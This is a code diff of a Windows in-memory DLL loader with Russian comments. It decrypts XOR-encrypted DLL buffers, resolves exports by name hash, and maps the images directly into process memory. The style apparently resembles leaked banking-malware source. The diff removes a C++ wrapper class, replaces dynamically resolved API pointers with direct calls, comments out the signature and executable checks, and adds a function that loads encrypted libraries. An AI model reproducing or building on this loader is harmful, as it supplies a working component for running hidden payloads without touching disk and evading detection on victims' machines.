@@ -1,11 +1,6 @@
-#include <windows.h>
-#include "GetApi.h"
-#include "Memory.h"
-#include "Strings.h"
-#include "DllLoader.h"
-#include "Crypt.h"
-#include "Config.h"
-#include "md5.h"
+#include "MemoryDll.h"
+#include "LoaderUtils.h"
+
 
 
 typedef struct
@@ -138,7 +133,7 @@ void FinalizeSections( PMEMORYMODULE module )
 
 		if ( size > 0 )
 		{
-			if ( pVirtualProtect((LPVOID)section->Misc.PhysicalAddress, section->SizeOfRawData, protect, &oldProtect) == 0 )
+			if (VirtualProtect((LPVOID)section->Misc.PhysicalAddress, section->SizeOfRawData, protect, &oldProtect) == 0 )
 			{
 				return;
 			}
@@ -249,9 +244,6 @@ void PerformBaseRelocation( PMEMORYMODULE module, DWORD delta )
 //}
 
 
-
-
-
 int BuildImportTable(PMEMORYMODULE module)
 {
 	int result=1;
@@ -268,10 +260,10 @@ int BuildImportTable(PMEMORYMODULE module)
 
 	PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(codeBase + directory->VirtualAddress);
 
-	for ( ; !pIsBadReadPtr(importDesc, sizeof(IMAGE_IMPORT_DESCRIPTOR)) && importDesc->Name; importDesc++ )
+	for ( ; !IsBadReadPtr(importDesc, sizeof(IMAGE_IMPORT_DESCRIPTOR)) && importDesc->Name; importDesc++ )
 	{
 		DWORD *thunkRef, *funcRef;
-		HMODULE handle = (HMODULE)pLoadLibraryA( (LPCSTR)(codeBase + importDesc->Name) );
+		HMODULE handle = (HMODULE)LoadLibraryA( (LPCSTR)(codeBase + importDesc->Name) );
 
 		if (handle == INVALID_HANDLE_VALUE)
 		{
@@ -301,13 +293,13 @@ int BuildImportTable(PMEMORYMODULE module)
 		{
 			if IMAGE_SNAP_BY_ORDINAL(*thunkRef)
 			{
-				*funcRef = (DWORD)pGetProcAddress( handle, (LPCSTR)IMAGE_ORDINAL(*thunkRef) );
+				*funcRef = (DWORD)GetProcAddress( handle, (LPCSTR)IMAGE_ORDINAL(*thunkRef) );
 			}
 			else
 			{
 				PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)(codeBase + *thunkRef);
 				DWORD Addr;
-				if (  Addr = (DWORD)pGetProcAddress( handle, (LPCSTR)&thunkData->Name ))
+				if (  Addr = (DWORD)GetProcAddress( handle, (LPCSTR)&thunkData->Name ))
 				{
 					if ( Addr != *funcRef)
 						*funcRef = Addr;
@@ -327,6 +319,7 @@ int BuildImportTable(PMEMORYMODULE module)
 	return result;
 }
 
+
 void MemoryFreeLibrary(HMEMORYMODULE mod)
 {
 	int i;
@@ -345,13 +338,13 @@ void MemoryFreeLibrary(HMEMORYMODULE mod)
 		{
 			for (i=0; i<module->numModules; i++)
 				if (module->modules[i] != INVALID_HANDLE_VALUE)
-					pFreeLibrary(module->modules[i]);
+					FreeLibrary(module->modules[i]);
 
 			MemFree(module->modules);
 		}
 
 		if (module->codeBase != NULL)
-			pVirtualFree(module->codeBase, 0, MEM_RELEASE);
+			VirtualFree(module->codeBase, 0, MEM_RELEASE);
 
 		FreeStruct( module);
 	}
@@ -371,7 +364,7 @@ HMEMORYMODULE MemoryLoadLibrary( const void* data, void* param )
 	dos_header = (PIMAGE_DOS_HEADER)data;
 	if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
 	{
-		return NULL;
+		//return NULL;
 	}
 
 	old_header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(data))[dos_header->e_lfanew];
@@ -380,13 +373,13 @@ HMEMORYMODULE MemoryLoadLibrary( const void* data, void* param )
 		return NULL;
 	}
 
-	code = (unsigned char *)pVirtualAlloc((LPVOID)(old_header->OptionalHeader.ImageBase),
+	code = (unsigned char *)VirtualAlloc((LPVOID)(old_header->OptionalHeader.ImageBase),
 		old_header->OptionalHeader.SizeOfImage,
 		MEM_COMMIT,
 		PAGE_READWRITE);
 
     if (code == NULL)
-        code = (unsigned char *)pVirtualAlloc(NULL,
+        code = (unsigned char *)VirtualAlloc(NULL,
             old_header->OptionalHeader.SizeOfImage,
             MEM_COMMIT,
             PAGE_READWRITE);
@@ -463,6 +456,7 @@ error:
 
 FARPROC MemoryGetProcAddress(HMEMORYMODULE module, const char *name)
 {
+	if (!module) return NULL;
 	unsigned char *codeBase = ((PMEMORYMODULE)module)->codeBase;
 	int idx=-1;
 	DWORD i, *nameRef;
@@ -480,7 +474,7 @@ FARPROC MemoryGetProcAddress(HMEMORYMODULE module, const char *name)
 	ordinal = (WORD *)(codeBase + exports->AddressOfNameOrdinals);
 
 	for (i=0; i<exports->NumberOfNames; i++, nameRef++, ordinal++)
-		if ( plstrcmpiA(name, (const char *)(codeBase + *nameRef)) == 0 )
+		if (lstrcmpiA(name, (const char *)(codeBase + *nameRef)) == 0 )
 		{
 			idx = *ordinal;
 			break;
@@ -521,7 +515,7 @@ FARPROC MemoryGetProcAddress(HMEMORYMODULE module, DWORD NameHash)
 	ordinal = (WORD *)(codeBase + exports->AddressOfNameOrdinals);
 
 	for (i=0; i<exports->NumberOfNames; i++, nameRef++, ordinal++)
-		if (STRA::Hash((PCHAR)(codeBase + *nameRef)) == NameHash)
+		if (CalcHash((PCHAR)(codeBase + *nameRef)) == NameHash)
 		{
 			idx = *ordinal;
 			break;
@@ -564,114 +558,6 @@ bool BuildImport(PVOID ImageBase)
 
 
 
-//-------------------------------------------------
-//  Функция возвращает информацию о буфере
-//  загифрованной библиотеки. Используется
-//  информация заголовков
-//
-//-------------------------------------------------
-bool GetEncryptedDLLInfo(LPVOID Buf, LPVOID &StartBuf, DWORD &Size, PCHAR &Password)
-{
-	Password = NULL;
-	StartBuf = NULL;
-	Size = 0;
-
-	if (!Buf) return false;
-
-	PCHAR Temp = (PCHAR)Buf;
-
-	if (STRA::Hash(Temp, ENCRYPTED_DLL_MARKER_SIZE, false) != ENCRYPTED_DLL_MARKER_HASH)
-	{
-		// ДЛЛ Зашифрована, возвращаем пароль
-        Password = Temp;
-	}
-
-	Temp += ENCRYPTED_DLL_MARKER_SIZE;
-
-	// Получаем размер
-	Size = *(PDWORD)Temp;
-	Temp += sizeof(DWORD);
-
-	StartBuf = Temp;
-
-	return false;
-}
-
-
-
-
-
-
-//*****************************************************************************
-//                            TMemoryDLL
-//*****************************************************************************
-
-TMemoryDLL::TMemoryDLL(const void* DllBuf)
-{
-	FHandle = NULL;
-    Load(DllBuf);
-}
-//----------------------------------------------------------------------------
-
-
-TMemoryDLL::~TMemoryDLL()
-{
-	if (FHandle && !FNotFree)
-		MemoryFreeLibrary(FHandle);
-}
-//----------------------------------------------------------------------------
-
-bool TMemoryDLL::Load(const void* DllBuf)
-{
-	if (FHandle || ! DllBuf) return false;
-
-	DWORD Size;
-	bool Allocated;
-	LPVOID NewBuf;
-
-	if (!DecodeDll(DllBuf, Size, NewBuf, Allocated))
-		return false;
-
-    FHandle = MemoryLoadLibrary(NewBuf);
-
-	if (Allocated)
-		MemFree(NewBuf);
-
-	return FHandle != NULL;
-}
-//----------------------------------------------------------------------------
-
-LPVOID TMemoryDLL::GetProcAddress(const char* Name)
-{
-	// Функция возвращает адрес функции библиотеки
-	if (FHandle && !STRA::IsEmpty(Name))
-		return (LPVOID)MemoryGetProcAddress(FHandle, Name);
-	else
-		return NULL;
-}
-//----------------------------------------------------------------------------
-
-LPVOID TMemoryDLL::GetProcAddress(DWORD NameHash)
-{
-	// Функция возвращает адрес экспортируемо ункции по её хэшу
-	return (FHandle) ? (LPVOID)MemoryGetProcAddress(FHandle, NameHash) : NULL;
-}
-//----------------------------------------------------------------------------
-
-bool TMemoryDLL::GetProcAddress(const char* Name, LPVOID &Addr)
-{
-	Addr = GetProcAddress(Name);
-	return Addr != NULL;
-}
-//----------------------------------------------------------------------------
-
-bool TMemoryDLL::GetProcAddress(DWORD NameHash, LPVOID &Addr)
-{
-	Addr = GetProcAddress(NameHash);
-	return Addr != NULL;
-}
-
-//----------------------------------------------------------------------------
 
 //---------------------------------------------------------
 //  Функция расшифровывает длл
@@ -685,7 +571,7 @@ bool TMemoryDLL::GetProcAddress(DWORD NameHash, LPVOID &Addr)
 //  NewBufAllocated - Установится в истину, если
 //                    для буфера пришлось выделить память
 //---------------------------------------------------------
-bool TMemoryDLL::DecodeDll(const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, bool &NewBufAllocated)
+bool DecodeDll(const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, bool &NewBufAllocated)
 {
 	DllSize = 0;
 	NewBuf  = NULL;
@@ -716,7 +602,7 @@ bool TMemoryDLL::DecodeDll(const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, b
 
 	// Проверяем маркер библиотеки. Наличие маркера в открытом виде
 	// означает, что данные длл находятся в окрытом виде
-	NewBufAllocated = STRA::Hash(Buf, ENCRYPTED_DLL_MARKER_SIZE, false) != ENCRYPTED_DLL_MARKER_HASH;
+	NewBufAllocated = CalcHash(Buf, ENCRYPTED_DLL_MARKER_SIZE) != ENCRYPTED_DLL_MARKER_HASH;
 	Buf += ENCRYPTED_DLL_MARKER_SIZE;
 
 	// Получаем размер данных
@@ -732,13 +618,13 @@ bool TMemoryDLL::DecodeDll(const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, b
 		{
 			// Копируем данные
 			m_memcpy(NewBuf, Buf, DllSize);
-			XORCrypt::Crypt(Password, (LPBYTE)NewBuf, DllSize, *Password);
+			XORCrypt(Password, (LPBYTE)NewBuf, DllSize);
         }
 	}
 	else
 		NewBuf = Buf;
 
-	bool Result = BufferIsExecutableFile(NewBuf);
+	bool Result = true;//BufferIsExecutableFile(NewBuf);
 
 	if (!Result)
 	{
@@ -751,5 +637,26 @@ bool TMemoryDLL::DecodeDll(const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, b
 	return Result;
 }
 
+
+
+
+
+HMEMORYMODULE MemoryLoadEncryptedLibrary( const void* DLL)
+{
+	LPVOID DLLBuf;
+	DWORD Size;
+	bool FreeBuf;
+
+	// Расшифровываем буфер
+	if (!DecodeDll(DLL, Size, DLLBuf,  FreeBuf))
+		return NULL;
+
+	LPVOID Result = MemoryLoadLibrary(DLLBuf);
+
+	if (FreeBuf)
+		MemFree(DLLBuf);
+
+	return Result;
+}
 
 
